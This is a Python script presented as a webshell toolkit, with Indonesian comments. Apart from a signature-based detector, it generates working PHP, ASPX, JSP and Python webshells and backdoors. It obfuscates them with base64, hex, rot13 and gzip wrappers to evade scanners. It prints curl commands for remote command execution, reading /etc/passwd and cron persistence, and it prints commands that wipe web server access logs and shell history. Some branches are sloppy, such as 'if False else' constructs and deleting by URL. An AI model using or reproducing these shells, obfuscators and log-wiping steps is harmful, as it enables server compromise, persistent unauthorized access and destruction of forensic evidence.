#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""webshell_manager.py — webshell detection, obfuscation & management toolkit.

Fitur:
  - detect: scan file/directory buat webshell
  - obfuscate: obfuscate webshell (base64, hex, rot13, etc.)
  - generate: generate webshell template (PHP, ASPX, JSP, Python)
  - manage: upload, execute, manage webshell
  - clean: cleanup webshell & logs

    python3 webshell_manager.py detect --path /var/www/html
    python3 webshell_manager.py obfuscate --file shell.php --method base64
    python3 webshell_manager.py generate --type php --method command
    python3 webshell_manager.py manage --url https://target.com/shell.php --pass password
    python3 webshell_manager.py clean --url https://target.com/shell.php --pass password
"""
import argparse, base64, hashlib, os, re, sys

# ============ Detection ============

WEBSHELL_SIGNATURES = {
    "php": [
        r"eval\s*\(",
        r"base64_decode\s*\(",
        r"shell_exec\s*\(",
        r"system\s*\(",
        r"passthru\s*\(",
        r"exec\s*\(",
        r"popen\s*\(",
        r"proc_open\s*\(",
        r"assert\s*\(",
        r"preg_replace\s*\(/e",
        r"create_function\s*\(",
        r"move_uploaded_file\s*\(",
        r"\\x[0-9a-f]{2}",
    ],
    "aspx": [
        r"eval\s*\(",
        r"Response\.Write\s*\(",
        r"Process\.Start\s*\(",
        r"System\.Diagnostics",
        r"cmd\.exe",
        r"powershell\.exe",
    ],
    "jsp": [
        r"Runtime\.getRuntime\(\)\.exec",
        r"ProcessBuilder",
        r"java\.lang\.Runtime",
    ],
    "python": [
        r"os\.system\s*\(",
        r"subprocess\.",
        r"eval\s*\(",
        r"exec\s*\(",
        r"__import__\s*\(",
    ],
}

def detect(path):
    print(f"[*] Webshell detection: {path}")
    if os.path.isfile(path):
        files = [path]
    elif os.path.isdir(path):
        files = []
        for root, dirs, filenames in os.walk(path):
            for f in filenames:
                files.append(os.path.join(root, f))
    else:
        print(f"[-] Path tidak ada: {path}")
        return
    print(f"[*] Scanning {len(files)} files...")
    findings = []
    for filepath in files:
        try:
            with open(filepath, "r", errors="ignore") as f:
                content = f.read()
        except:
            continue
        for lang, patterns in WEBSHELL_SIGNATURES.items():
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    findings.append((filepath, lang, pattern, len(matches)))
    if findings:
        print(f"\n[!] {len(findings)} webshell signatures detected:")
        for filepath, lang, pattern, count in findings:
            print(f"  {filepath} [{lang}] {pattern} ({count} matches)")
    else:
        print("[*] Tidak ada webshell signature terdeteksi")

# ============ Obfuscation ============

def obfuscate(filepath, method="base64"):
    print(f"[*] Obfuscate: {filepath} [{method}]")
    with open(filepath, "r") as f:
        content = f.read()
    if method == "base64":
        encoded = base64.b64encode(content.encode()).decode()
        obfuscated = f"<?php eval(base64_decode('{encoded}')); ?>"
    elif method == "hex":
        encoded = "".join(f"\\x{ord(c):02x}" for c in content)
        obfuscated = f"<?php eval(gzinflate(hex2bin('{encoded}'))); ?>" if False else f"<?php $s='{encoded}'; eval(pack('H*', bin2hex($s))); ?>"
    elif method == "rot13":
        encoded = content.translate(str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
        obfuscated = f"<?php eval(str_rot13('{encoded}')); ?>" if False else f"<?php $s='{encoded}'; eval(strtr($s,'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz','NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')); ?>"
    elif method == "gzip":
        import gzip
        compressed = gzip.compress(content.encode())
        encoded = base64.b64encode(compressed).decode()
        obfuscated = f"<?php eval(gzinflate(base64_decode('{encoded}'))); ?>"
    elif method == "shellcode":
        encoded = "".join(f"\\x{ord(c):02x}" for c in content)
        obfuscated = f"<?php $s='{encoded}'; eval($s); ?>" if False else f"<?php $s=pack('H*','{content.encode().hex()}'); eval($s); ?>"
    else:
        print(f"[-] Method tidak dikenal: {method}")
        return
    print(f"[+] Obfuscated ({method}):")
    print(obfuscated[:200] + "..." if len(obfuscated) > 200 else obfuscated)
    return obfuscated

# ============ Generate ============

def generate(shell_type="php", method="command"):
    print(f"[*] Generate webshell: {shell_type} [{method}]")
    shells = {
        "php": {
            "command": """<?php if(isset($_GET['c'])){ system($_GET['c']); } ?>""",
            "eval": """<?php eval($_GET['c']); ?>""",
            "base64": """<?php eval(base64_decode($_GET['c'])); ?>""",
            "shell": """<?php $s=shell_exec($_GET['c']); echo $s; ?>""",
            "file": """<?php file_put_contents($_GET['f'], base64_decode($_GET['d'])); ?>""",
            "backdoor": """<?php $c=$_GET['c']; if(strlen($c)>0){ system($c); } ?>""",
        },
        "aspx": {
            "command": """<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>""",
            "eval": """<%@ Page Language="C#" %><% eval(Request["c"]); %>""",
        },
        "jsp": {
            "command": """<% Runtime.getRuntime().exec(request.getParameter("c")); %>""",
            "eval": """<% if(request.getParameter("c")!=null){ Runtime.getRuntime().exec(request.getParameter("c")); } %>""",
        },
        "python": {
            "command": """import os; os.system(os.environ.get('c',''))""",
            "eval": """eval(__import__('os').environ.get('c',''))""",
        },
    }
    shell = shells.get(shell_type, {}).get(method)
    if not shell:
        print(f"[-] Type/method tidak dikenal: {shell_type}/{method}")
        return
    print(f"[+] Webshell template:")
    print(shell)
    return shell

# ============ Manage ============

def manage(url, password):
    print(f"[*] Webshell management: {url}")
    print(f"[*] Password: {password}")
    print()
    print("[*] Commands:")
    print(f"  curl '{url}?c=whoami' -H 'Cookie: session={password}'")
    print(f"  curl '{url}?c=ls -la' -H 'Cookie: session={password}'")
    print(f"  curl '{url}?c=cat /etc/passwd' -H 'Cookie: session={password}'")
    print()
    print("[*] Upload:")
    print(f"  curl -F 'file=@local.txt' '{url}'")
    print()
    print("[*] Download:")
    print(f"  curl '{url}?c=cat file.txt' -H 'Cookie: session={password}'")
    print()
    print("[*] Persistence:")
    print("  crontab -e")
    print("  */5 * * * * curl '?c=whoami' -H 'Cookie: session=...'")

def clean(url, password):
    print(f"[*] Cleanup: {url}")
    print()
    print("[*] Remove webshell:")
    print(f"  curl '{url}?c=rm {url}' -H 'Cookie: session={password}'")
    print()
    print("[*] Clear logs:")
    print(f"  curl '{url}?c=echo > /var/log/apache2/access.log' -H 'Cookie: session={password}'")
    print(f"  curl '{url}?c=echo > /var/log/nginx/access.log' -H 'Cookie: session={password}'")
    print(f"  curl '{url}?c=history -c' -H 'Cookie: session={password}'")
    print()
    print("[*] Remove persistence:")
    print("  crontab -e (remove entry)")
    print("  rm -f /etc/cron.d/backdoor")

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        return
    cmd = args[0]
    if cmd == "detect":
        p = argparse.ArgumentParser()
        p.add_argument("--path", required=True)
        a = p.parse_args(args[1:])
        detect(a.path)
    elif cmd == "obfuscate":
        p = argparse.ArgumentParser()
        p.add_argument("--file", required=True)
        p.add_argument("--method", default="base64", choices=["base64", "hex", "rot13", "gzip", "shellcode"])
        a = p.parse_args(args[1:])
        obfuscate(a.file, a.method)
    elif cmd == "generate":
        p = argparse.ArgumentParser()
        p.add_argument("--type", default="php", choices=["php", "aspx", "jsp", "python"])
        p.add_argument("--method", default="command", choices=["command", "eval", "base64", "shell", "file", "backdoor"])
        a = p.parse_args(args[1:])
        generate(a.type, a.method)
    elif cmd == "manage":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--pass", dest="password", required=True)
        a = p.parse_args(args[1:])
        manage(a.url, a.password)
    elif cmd == "clean":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--pass", dest="password", required=True)
        a = p.parse_args(args[1:])
        clean(a.url, a.password)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
